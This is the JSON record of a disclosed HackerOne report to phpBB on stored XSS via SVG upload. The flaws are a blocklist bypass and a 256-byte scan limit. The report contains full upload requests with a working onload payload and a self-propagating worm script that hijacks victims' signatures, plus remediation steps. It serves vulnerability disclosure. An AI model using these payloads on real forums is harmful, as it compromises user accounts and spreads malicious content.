@@ -1,0 +1,200 @@
+{
+  "id": 3606773,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjA2Nzcz",
+  "url": "https://hackerone.com/reports/3606773",
+  "title": "Stored XSS via SVG Upload — check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-03-16T02:35:10.286Z",
+  "submitted_at": "2026-03-16T02:35:10.682Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "a7mmr",
+    "url": "/a7mmr",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/n14wdzu3f5orvkgxdzf4vd7xzzoc/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8936,
+    "url": "https://hackerone.com/phpbb",
+    "handle": "phpbb",
+    "profile_picture_urls": {
+      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/qv48zkf423avl8lwrpzkjsh87o74/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b?response-content-disposition=inline%3B%20filename%3D%22176697.png%22%3B%20filename%2A%3DUTF-8%27%27176697.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b1664c8f2867342f3cb68e3144e2b5e9148a534d243bb26a0e42a0d058281fb0",
+      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/qv48zkf423avl8lwrpzkjsh87o74/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542?response-content-disposition=inline%3B%20filename%3D%22176697.png%22%3B%20filename%2A%3DUTF-8%27%27176697.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eb306eab55a00df7d9b8c78b787198646f70890c0f34a253cb10eed2cab6cd9a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "phpBB",
+      "twitter_handle": "phpbb",
+      "website": "https://www.phpbb.com",
+      "about": "phpBB is the world's most popular free and open source forum software."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-07-30T20:29:27.085Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-06-30T20:29:22.916Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Title\nStored XSS via SVG Upload — check_content() Blocklist Bypass & 256-Byte Scan Limit (Self-Propagating Worm)\n\n---\n\n# Description\n\n**Tested Version:** phpBB `4.0.0-a2-dev` (Docker, latest master branch as of March 2026)\n\nphpBB implements a content-scanning check (`phpbb\\files\\filespec_storage::check_content()`) to prevent upload of malicious files. Two critical, independently exploitable flaws exist:\n\n**Flaw 1 — Incomplete Blocklist (`phpbb/files/upload.php`, line 29):**\nThe `$disallowed_content` array does not include SVG-specific XSS vectors:\n```php\nprotected $disallowed_content = array('body', 'head', 'html', 'img', 'plaintext', 'a href', 'pre', 'script', 'table', 'title');\n```\nTags such as `<svg onload=\"\">` and `<animate onbegin=\"\">` are absent, so a valid SVG with an `onload` event passes the check and is stored on disk.\n\n**Flaw 2 — 256-Byte Read Limit (`phpbb/files/filespec_storage.php`, line 364):**\n```php\n$ie_mime_relevant = fread($fp, 256); // Only first 256 bytes are scanned\n```\nPadding any payload (including explicitly blocked tags like `<script>`) beyond the 256-byte boundary completely bypasses validation.\n\n**Delivery Vector — Inline SVG Serving (`phpbb/storage/controller/attachment.php`):**\nUploaded SVG files are served with `Content-Disposition: inline` and `Content-Type: image/svg+xml`, causing the browser to render and execute embedded JavaScript when the attachment link is clicked.\n\n**Non-Default Configuration Note:**\n`.svg` is not in phpBB's default allowed extensions list. An administrator must explicitly permit it. Additionally, SVG must be assigned to a non-image extension group (e.g., \"Documents\") — assigning it to \"Images\" causes `getImageSize()` to reject it silently.\n\n---\n\n# Reproduction Steps\n\n## Setup (Docker — quickstart for triager)\n```bash\ndocker compose up -d\n```\nInstall phpBB at `http://localhost:8080/install`, then in ACP → Extensions → Manage: add `svg` extension, assign to a new group \"SVG Files\", set \"Display Inline\" = **No**.\n\n---\n\n## Part 1: Basic XSS Proof (Burp Suite Bypass)\n\nThe client-side `plupload` restricts `.svg` uploads in the browser. We bypass it by intercepting the upload request with Burp Suite.\n\n**Step-by-step:**\n1. Log in as any registered user.\n2. Start a **New Topic**, add the provided `xss_onload.jpg` (dummy file) via the Attachments panel.\n3. Enable **Burp Suite Intercept** and click \"Add the file\".\n4. Replace the intercepted request body with the following complete request (substituting your own live `Cookie`, `form_token`, and `creation_time` values from the original intercepted request):\n\n```\nPOST /posting.php?mode=post&f=2 HTTP/1.1\nHost: localhost:8080\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryFFEaAfSerpQAkd4Q\nx-phpbb-using-plupload: 1\nx-requested-with: XMLHttpRequest\nCookie: ***********************************\nConnection: keep-alive\n\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"name\"\n\ndummy.jpg\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"chunk\"\n\n0\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"chunks\"\n\n1\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"add_file\"\n\nAdd the file\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"creation_time\"\n\nYOUR_CREATION_TIME_HERE\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"form_token\"\n\nYOUR_FORM_TOKEN_HERE\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"real_filename\"\n\nxss_onload.svg\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q\nContent-Disposition: form-data; name=\"fileupload\"; filename=\"xss_onload.svg\"\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS execution on: ' + document.domain)\">\n  <rect width=\"200\" height=\"200\" fill=\"#00ff00\"/>\n  <text x=\"10\" y=\"100\" fill=\"black\" font-size=\"14\">SVG XSS PoC</text>\n</svg>\n\n------WebKitFormBoundaryFFEaAfSerpQAkd4Q--\n```\n\n5. Click **Forward** and turn Intercept **OFF**.\n6. Back in the browser, write any topic title and click **Submit**.\n7. View the published post and click the `xss_onload.svg` attachment link.\n8. **Result:** `alert('XSS execution on: localhost:8080')` fires in the browser.\n\n---\n\n## Part 2: Weaponized XSS Worm (Self-Propagating)\n\nUses the same Burp bypass but with the `xss-worm.svg` payload, which silently mutates the victim's profile using their own authenticated session.\n\n**Complete ready-to-paste request (substitute your session values):**\n\n```\nPOST /posting.php?mode=post&f=2 HTTP/1.1\nHost: localhost:8080\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryF4vyqZURwpTrUxKo\nx-phpbb-using-plupload: 1\nx-requested-with: XMLHttpRequest\nCookie: ***************************************\nConnection: keep-alive\n\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"name\"\n\ndummy.jpg\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"chunk\"\n\n0\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"chunks\"\n\n1\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"add_file\"\n\nAdd the file\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"creation_time\"\n\nYOUR_CREATION_TIME_HERE\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"form_token\"\n\nYOUR_FORM_TOKEN_HERE\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"real_filename\"\n\nxss-worm.svg\n------WebKitFormBoundaryF4vyqZURwpTrUxKo\nContent-Disposition: form-data; name=\"fileupload\"; filename=\"xss-worm.svg\"\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!-- PADDING BYPASS: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -->\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"init()\">\n  <script><![CDATA[\n    function init() {\n      fetch('/ucp.php?i=ucp_profile&mode=signature')\n        .then(r => r.text())\n        .then(html => {\n          let ft = html.match(/name=\"form_token\"\\s+value=\"([^\"]+)\"/);\n          let ct = html.match(/name=\"creation_time\"\\s+value=\"([^\"]+)\"/);\n          if (ft && ct) {\n            let d = new URLSearchParams();\n            d.append('signature', '[url=http://attacker.example.com]Infected by XSS Worm![/url]');\n            d.append('submit', 'Submit');\n            d.append('creation_time', ct[1]);\n            d.append('form_token', ft[1]);\n            fetch('/ucp.php?i=ucp_profile&mode=signature', {\n              method: 'POST',\n              headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n              body: d.toString()\n            }).then(() => alert('XSS Worm: Signature hijacked!'));\n          }\n        });\n    }\n  ]]></script>\n</svg>\n\n------WebKitFormBoundaryF4vyqZURwpTrUxKo--\n```\n\n**Attack flow:**\n1. Upload `xss-worm.svg` as attacker user (`hacker`).\n2. Log in as a different user (`admin`) in a separate browser session (incognito).\n3. Navigate to the post and click the `xss-worm.svg` attachment link.\n4. **Observed result:** Alert fires: `\"XSS Worm: Signature hijacked!\"`\n5. Navigate to `UCP → Profile → Edit Signature`.\n6. **Observed result:** Admin's signature now reads `[url=http://attacker.example.com]Infected by XSS Worm![/url]` — set silently without any additional interaction.\n\n---\n\n## Part 3: Backend Flaw Proof (No Browser Required)\n\n```bash\nphp poc-svg-xss.php\n```\nOutput proves `check_content()` accepts `<svg onload>`, `<animate onbegin>`, and bypasses the 256-byte limit for `<script>` tags.\n\n---\n\n\n# Attachments\n\n| File | Purpose |\n|------|---------|\n| `docker-compose.yml` | One-command environment setup for triager |\n| `poc-svg-xss.php` | Standalone PHP script proving `check_content()` bypasses |\n| `xss_onload.svg` | Minimal SVG payload — blocklist bypass (`onload`) |\n| `xss-worm.svg` | **Verified** weaponized self-propagating worm payload |\n| `xss_onload.jpg` | Dummy JPG file used for Burp Suite bypass (rename trick) |\n\n---\n\n# Remediation\n\n1. **Remove 256-byte limit:** Scan the full file, not just the first 256 bytes.\n2. **Expand blocklist:** Add `svg`, `animate`, `set`, `foreignObject`, `use`, `onload`, `onbegin` to `$disallowed_content`.\n3. **Force `Content-Disposition: attachment` for SVG:** Never serve SVG files inline — force a download instead of browser rendering.\n\n## Impact\n\n**Stored XSS — Self-Propagating Signature Worm **\n\n**Honest Limitations:**\n- `HttpOnly` cookies prevent `document.cookie` extraction.\n- The `cur_password` field is required to change account credentials via UCP, preventing blind AJAX-based credential takeover.\n\n**Actual Impact :**\nThe XSS fires in the victim's same-origin browser context, allowing the attacker's JS to silently make authenticated requests to any UCP endpoint that does **not** require `cur_password`. The Signature endpoint (`/ucp.php?i=ucp_profile&mode=signature`) is fully writable with CSRF tokens alone.\n\nBy changing the victim's Signature, **every post they have ever made** is instantly updated to embed the attacker's payload link. Any user who views a thread containing the victim's posts is exposed to the payload, which can in turn infect their signature. This creates an exponentially self-propagating XSS worm capable of compromising the entire forum userbase from a single infected post.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5541103,
+      "file_name": "docker-compose.yml",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/71b5emuxyuhofxylx10hihb2i9cq?response-content-disposition=attachment%3B%20filename%3D%22docker-compose.yml%22%3B%20filename%2A%3DUTF-8%27%27docker-compose.yml&response-content-type=text%2Fx-yaml&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1c96465088c9b31bdd58f68ef4ea0c0eb68735d6e97789a1ba31d7e71b2f3f12",
+      "file_size": 532,
+      "type": "text/x-yaml",
+      "moderated": null
+    },
+    {
+      "id": 5541104,
+      "file_name": "poc-svg-xss.php",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/95coja52au9i62flvkh35nxy0b35?response-content-disposition=attachment%3B%20filename%3D%22poc-svg-xss.php%22%3B%20filename%2A%3DUTF-8%27%27poc-svg-xss.php&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e87ca01d9b505408a222617757bd967a0464be52f5575c303a3b21bd14f58dd2",
+      "file_size": 2505,
+      "type": "image/svg+xml",
+      "moderated": null
+    },
+    {
+      "id": 5541106,
+      "file_name": "xss_onload.svg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wxhgos7847iafh96jhzl42ng975y?response-content-disposition=attachment%3B%20filename%3D%22xss_onload.svg%22%3B%20filename%2A%3DUTF-8%27%27xss_onload.svg&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCPE7BOZ%2F20260730%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260730T210643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAk2eVVeZGTY0dVjb2f5METaMmfkF6m7uIVGtQhxPG5OAiEAo%2BZRoZR8k2qoFf28nuoFHSBoTTHcAkIgJ7YvkjxrHjIqugUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGLmNm2RN1ba4%2FO%2FyyqOBSwgHU4EHm%2FlWUb0fZd6FL%2BEvZapNT4Y6nTreg0fDOq64lhV%2Bq7a7pDCkOZijHvQfXgKgqljsR3wyBg%2BNc%2BAnqMnTv3Y2H7%2BxME7ztg7x9%2F5gynP3XMG4oagFMXbDQAiy7z7DWaf%2BB8Gs6871HRXaS4VgADIJruyZhVtScfhhopWJ88Ue3DIsPz94xscbkHh05JEPJrO6a8YWyyqA%2FBZNKYeVrhRwGSwhj4xF%2BktJkSpa6mT66yKrK%2F1bXb7xFQheSncZjj6h968SeqXUy8MoYckHLa%2F9q%2BzC%2BVp4wAeI2Pqhgy6GvNMIKwhfpzDNsDj1zNWd3Pl%2FlFqd5QVwXXTZFu2l1wzMTgIx1jYhWsNnBAzCcf39kAJ8zJ4Oq3cmuR2cbt%2BH5IsXQjsz2R%2BElLlvFupcs6hgC0DP7nAYnl3klNo%2B9wb2cWkIe8bz5l1F92n3VGwvDwQNps4KfrnWH4NIXt1FPTYmxLCDLKiT%2FLYlzPe5k%2BpPuRdOieNSRUGkXrzwou0pdPlPUbAw8WeTWgTDdx5QhxAD%2FqOADTXLlicwaN9xyPpGGlIpXU2a8Kcai5Z9wCBkiNMddgnBewv%2FFJhHwrGD9aG4JDYVM4WlTPxyVNCmQmwRufjuxo3hGFw0Z8QiAeg1XBYOlGVGkHg6ijQ73Ah%2FsrbYKVMp4PKktr%2FaA1Ry6Pbus7TE9brukTXHXeUHnNURZ9qdcRMnXDaGwcDNmkvvwVoxsWe4%2B%2Fw1jq9qlcjfw41vpjjRf%2F7eXUd1yKSiP2d9XYCmwl9AfxgWhtlGtVqHnsorghV2TRpYsMnXA6wC7NLENuj3YOZJwCaLjsiPy1e%2Fn%2B8Nq%2BCDXLAwyQ%2FNahQSYgjSvOPjh99mO7qEjDCmK7TBjqxAWrOub259lUhZPPMdoW7ofiBhtpEH%2FR6dJMx7hjZjKB0AxaQ4Jw38BRTyFYKkgg8ta1g1gRDfJ2%2BUzSPL7ZZUl2%2FaFgNkKCrBp0jZdu0SL2Yb3n%2FZu8IokJ9qE47GiHJ%2FWmchaI0tYu9RzrpHJgHhXRUWLZN60WTt2WFH7yannW6m2PglyxJsuNg0zyIBvuebJGhFVmsrWP30p4bDcO279Ff2WFpPoz1PiLyOTQoi%2B5hOw%3D